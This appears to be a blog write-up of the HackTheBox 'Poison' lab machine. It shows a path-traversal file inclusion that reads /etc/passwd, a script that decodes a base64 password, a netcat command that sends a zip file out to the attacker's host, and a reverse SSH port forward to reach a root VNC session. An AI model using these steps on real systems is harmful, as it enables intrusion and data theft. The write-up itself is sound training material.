---
layout: post
title: HackTheBox - Poison Writeup
tags: [hackthebox]
---

Poision is a pretty straight forward box overall but did include a couple of unique things which made it fun. 

### Initial Enumeration

Ye olde quick nmap scan.

```
root@kali:~# nmap -sV 10.10.10.84

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-24 12:27 CDT
Nmap scan report for 10.10.10.84
Host is up (0.052s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Let's check out port 80 in the browser.

![site](/img/poison-site.png)

We can check each of these files in the Scriptname field. When we check listfiles.php we get the following:

![files](/img/poison-files.png)

Notice the URL as well, which based off how it's calling these files is probably vulnerable to an LFI. 

Let's look at pwdbackup.txt first, since that seems interesting.

```
root@kali:~/htb/poison# curl http://10.10.10.84/browse.php?file=pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```

13 times eh? Well let's compile a quick python script to quickly decode this instead of doing it manually.

```python
import base64


string = """
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo= """

def decode(b64_string, iterations):
    i = 0
    while i < iterations:
        b64_string = base64.b64decode(b64_string).decode('utf-8')
        i += 1
    print(b64_string)

decode(string, 13)
```

Testing the script and running:

```
root@kali:~/htb/poison# python3 decode.py 
Charix!2#4%6&8(0
```

Voila! We have a password, however we still need a username. 

Let's test for an LFI.

```
root@kali:~/htb/poison# curl http://10.10.10.84/browse.php?file=../../../etc/passwd
<br />
<b>Warning</b>:  include(../../../etc/passwd): failed to open stream: No such file or directory in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '../../../etc/passwd' for inclusion (include_path='.:/usr/local/www/apache24/data') in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
```

Okay so we can see here that include() is indeed being used and we also see the include path, so we'll need to go up five directories first to try to escape to the root dir.

```
root@kali:~/htb/poison# curl http://10.10.10.84/browse.php?file=../../../../../etc/passwd
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

And we have a username of charix.

Let's try out ssh with our username and password.

```
root@kali:~/htb/poison# ssh charix@10.10.10.84
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
You can often get answers to your questions about FreeBSD by searching in the
FreeBSD mailing list archives at

        http://www.FreeBSD.org/search/search.html
charix@Poison:~ % 
```

In!

### Privilege Escalation

Looking in our home directory we see a suspicious zip file.

```
charix@Poison:~ % ls -al
total 48
drwxr-x---  2 charix  charix   512 Mar 19 17:16 .
drwxr-xr-x  3 root    wheel    512 Mar 19 16:08 ..
-rw-r-----  1 charix  charix  1041 Mar 19 17:16 .cshrc
-rw-rw----  1 charix  charix     0 Mar 19 17:17 .history
-rw-r-----  1 charix  charix   254 Mar 19 16:08 .login
-rw-r-----  1 charix  charix   163 Mar 19 16:08 .login_conf
-rw-r-----  1 charix  charix   379 Mar 19 16:08 .mail_aliases
-rw-r-----  1 charix  charix   336 Mar 19 16:08 .mailrc
-rw-r-----  1 charix  charix   802 Mar 19 16:08 .profile
-rw-r-----  1 charix  charix   281 Mar 19 16:08 .rhosts
-rw-r-----  1 charix  charix   849 Mar 19 16:08 .shrc
-rw-r-----  1 root    charix   166 Mar 19 16:35 secret.zip
-rw-r-----  1 root    charix    33 Mar 19 16:11 user.txt
```

Let's exfil this with netcat over to our attacking machine.

```
charix@Poison:~ % nc -w 2 10.10.14.8 443 < secret.zip
```

```
root@kali:~/htb/poison# nc -lvnp 443 > secret.zip
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.84] 13787
```

The zip is password protected but we can use the same password as charix's ssh password to successfully unzip.

```
root@kali:~/htb/poison# unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password:
 extracting: secret
```

Checking out the file we can see that it's supposedly a regular ASCII file. 


```
root@kali:~/htb/poison# file secret
secret: Non-ISO extended-ASCII text, with no line terminators
root@kali:~/htb/poison# cat secret
[|Ֆz!
```

However there's just garbage in the file contents itself. 

Let's enum the box some more.


After checking running processes with `ps aux` we see the following entry.

```
root    529   0.0  0.9  23620  8996 v0- I    19:17     0:00.22 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geo
root    540   0.0  0.7  67220  7060 v0- I    19:17     0:00.07 xterm -geometry 80x24+10+10 -ls -title X Desktop
```

And we also see some ports listening locally.

```
charix@Poison:~ % netstat -an
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 10.10.10.84.22         10.10.14.8.44976       ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
udp4       0      0 *.514                  *.*                    
udp6       0      0 *.514                  *.* 
```

Port 5801 and 5901 are normally used by VNC, which matches with the running VNC session we see in processes. Let's port forward this over to our attacking machine so we have access (make sure you start SSH on your attacking box!).

```
charix@Poison:~ % ssh -l root -R 5801:127.0.0.1:5901 10.10.14.8
root@10.10.14.8's password: 

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@kali:~#
```

If we check our listening connections on kali we see the port forward was successful.

```
root@kali:~# netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5801          0.0.0.0:*               LISTEN     
tcp        0      0 10.10.14.8:44976        10.10.10.84:22          ESTABLISHED
tcp        0      0 10.10.14.8:22           10.10.10.84:54672       ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 ::1:5801                :::*                    LISTEN
```

`vncviewer` allows you to pass a passwd file to it for authentication with the `-passwd` option, so perhaps we can pass our secret file for authentication. 

```
root@kali:~/htb/poison# vncviewer -h
TightVNC Viewer version 1.3.9

Usage: vncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       vncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       vncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       vncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
~
~
```

```
root@kali:~/htb/poison# vncviewer -passwd secret 127.0.0.1:5801
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
```

![root](/img/poison-root.png)

And done!